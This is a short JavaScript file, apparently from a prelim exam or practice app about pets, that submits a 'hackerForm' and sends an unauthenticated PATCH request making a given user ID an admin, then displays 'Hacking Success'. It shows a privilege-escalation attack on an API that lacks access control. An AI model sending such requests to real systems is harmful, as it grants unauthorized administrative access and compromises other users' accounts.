document.getElementById('hackerForm').addEventListener('submit', function(e) {
    e.preventDefault();
    becomeAdmin();
});

async function becomeAdmin() {
    const id = document.getElementById('id').value;

    try {
        const response = await fetch(`https://prelim-exam.onrender.com/users/${id}`, {
            method: 'PATCH',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ role: 'admin' })
        });

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        console.log('Success:', data);

        result.innerHTML = `
            <h2>Hacking Success</h2>
            <p>You are now an admin!</p>
            <a href="allPets.html">View All Pets</a>
        `;
    }
        
    catch (error) {
        console.error('Error:', error);
    }
}